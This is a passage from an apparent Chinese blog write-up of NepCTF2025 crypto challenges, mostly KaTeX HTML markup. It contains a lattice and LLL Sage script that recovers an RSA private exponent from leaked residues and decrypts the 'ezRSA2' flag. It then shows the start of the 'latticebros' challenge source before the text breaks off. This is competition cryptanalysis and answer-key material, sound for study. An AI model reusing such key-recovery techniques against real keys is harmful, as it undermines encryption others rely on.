class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span></span></span></span></span></p><p><strong>配平</strong>一下目标向量，<code>k1</code>大概在<strong>333位</strong>这样，<code>k2</code>在<strong>675位</strong>这样，<code>k2(p+q)</code>大概会在<strong>1700位</strong>，所以有</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><msub><mi>k</mi><mn>2</mn></msub></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>∗</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mn>2</mn><mn>1700</mn></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>e</mi><msub><mi>d</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mn>2</mn><mn>1370</mn></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>e</mi><mi>M</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>N</mi><mo>+</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mtext> </mtext><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mn>2</mn><mn>1700</mn></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>k</mi><mn>1</mn></msub><mo>∗</mo><msup><mn>2</mn><mn>1370</mn></msup></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>p</mi><mo>+</mo><mi>q</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\left [ \begin{matrix}1&amp;k_1&amp;-k_{2}\\\end{matrix} \right ]*\left [ \begin{matrix}2^{1700}&amp;0&amp;ed_{low}-1\\0&amp;2^{1370}&amp;eM\\0&amp;0&amp;N+1\\\end{matrix} \right ]\ =\left [ \begin{matrix}2^{1700}&amp;k_1*2^{1370}&amp;k_{2}(p+q)\\\end{matrix} \right ]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span><span class="mord mtight">7</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span><span class="mord mtight">7</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span></span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line">N = <span class="number">0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line">hints = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">2</span>, <span class="number">20</span>, <span class="number">62</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">22</span>, <span class="number">56</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">78</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">6</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">73</span>, <span class="number">75</span>, <span class="number">96</span>, <span class="number">112</span>, <span class="number">50</span>, <span class="number">93</span>, <span class="number">158</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">8</span>, <span class="number">65</span>, <span class="number">96</span>, <span class="number">186</span>, <span class="number">161</span>, <span class="number">90</span>, <span class="number">131</span>, <span class="number">46</span>, <span class="number">32</span>, <span class="number">140</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">43</span>, <span class="number">151</span>, <span class="number">234</span>]</span><br><span class="line">ct = <span class="number">0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line">primes = <span class="built_in">list</span>(sieve_base[<span class="number">1</span>:<span class="built_in">len</span>(hints)+<span class="number">1</span>])</span><br><span class="line">M = prod(primes)</span><br><span class="line">d_low = crt(hints,primes)</span><br><span class="line"></span><br><span class="line">mat = [[<span class="number">2</span>^<span class="number">1700</span>, <span class="number">0</span>, e*d_low-<span class="number">1</span>], [<span class="number">0</span>, <span class="number">2</span>^<span class="number">1370</span>, e*M], [<span class="number">0</span>, <span class="number">0</span>, N + <span class="number">1</span>]]</span><br><span class="line">L = Matrix(ZZ, mat)</span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> L.LLL():</span><br><span class="line">    k, K1, _ = res</span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">2</span>^<span class="number">1700</span>:</span><br><span class="line">        d = (K1//<span class="number">2</span>^<span class="number">1370</span>)*M + d_low</span><br><span class="line">        flag = long_to_bytes(<span class="built_in">pow</span>(ct,d,N)).decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;NepCTF&#123;&#x27;</span> + flag + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这样看的话，貌似格更方便一些……</p><h2 id="思路三"><a class="markdownIt-Anchor" href="#思路三"></a> 思路三</h2><p><a href="https://eprint.iacr.org/2018/516.pdf">boneh durfee通过LSBs拔高上界 P30 Section 5</a><br />具体怎么实现不了了之，但感觉是<strong>二元copper</strong>的优化，或者说<strong>二元copper</strong>的<strong>small_roots</strong>是从<strong>boneh durfee算法</strong>中来的？<br />不清楚，反正我套的()</p><h2 id="reference-2"><a class="markdownIt-Anchor" href="#reference-2"></a> reference</h2><ul><li><a href="https://faritree.top/2025/07/28/NepCTF2025-Crypto-WP">Crypto全解</a></li><li><a href="https://su1yu4n.github.io/2025/08/01/NepCTF2025-ezRSA2%E5%AE%98%E6%96%B9%E9%A2%98%E8%A7%A3">出题人题解</a></li></ul><h1 id="nepctf2025-latticebros"><a class="markdownIt-Anchor" href="#nepctf2025-latticebros"></a> NepCTF2025 - latticebros</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#已知α的极小多项式为三次多项式f(x),即f(α)=0,且α≈54236.606188881754809671280151541781895183337725393</span></span><br><span class="line"><span class="comment">#上述极小多项式的常数项为a0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> a0,alpha</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt,log2</span><br><span class="line"></span><br><span class="line">d=<span class="number">981020902672546902438782010902608140583199504862558032616415</span></span><br><span class="line">p = d - a0</span><br><span class="line"></span><br><span class="line">k=sqrt(log2(p))+log2(log2(p))</span><br><span class="line">B = <span class="number">2</span>**<span class="number">30</span></span><br><span class="line"><span class="keyword">assert</span> B &lt; p/<span class="number">2</span>**k</span><br><span class="line"></span><br><span class="line">m = <span class="number">30</span></span><br><span class="line"><span class="keyword">assert</span> m &gt; <span class="number">2</span>*sqrt(log2(p))</span><br><span class="line"></span><br><span class="line">samples = []</span><br><span class="line">betas = []</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;samples.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    t = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line">    beta = random.randint(-B + <span class="number">1</span>, B - <span class="number">1</span>)</span><br><span class="line">    a = (t * alpha - beta) % p</span><br><span class="line">    samples.append((t, a))</span><br><span class="line">    betas.append(beta)</span><br><span class="line"></span><br><span class="line">f.write(<span class="built_in">str</span>(samples))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">assert</span> (betas[i]-samples[i][<span class="number">0</span>]*alpha+samples[i][<span class="number">1</span>])%p == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag = 